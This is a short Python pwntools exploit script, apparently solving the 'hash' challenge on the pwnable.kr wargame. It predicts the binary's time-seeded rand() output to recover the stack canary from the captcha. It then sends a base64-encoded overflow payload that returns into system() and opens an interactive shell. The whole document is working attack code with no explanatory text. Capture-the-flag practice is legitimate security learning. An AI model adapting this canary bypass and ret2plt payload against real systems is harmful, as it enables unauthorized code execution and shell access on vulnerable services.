from pwn import *
import base64
import ctypes

#p = process("./hash")
p = remote("pwnable.kr", 9002)
elf = ELF("./hash")
libc1 = ctypes.CDLL("libc.so.6")

libc1.srand(int(time.time()))
v = [0, 0]
if __name__ == "__main__":
	for i in range(0, 8):
		v.append(libc1.rand())	
	p.recvuntil("Are you human? input captcha : ")
	captcha = str(int(p.recvline()))
	canary = int(captcha) - v[6] + v[8] - v[9] - v[4] + v[5] - v[3] - v[7]
	canary &= 0xffffffff
	p.info("canary : " + hex(canary))
	p.sendline(captcha)
	p.recvuntil("Encode your data with BASE64 then paste me!")
	pause()
	p.sendline(base64.b64encode("a" * 512 + p32(canary) + "b" * 12 + p32(elf.plt['system']) + "b" * 4 + p32(0x8048482)))
	p.interactive()

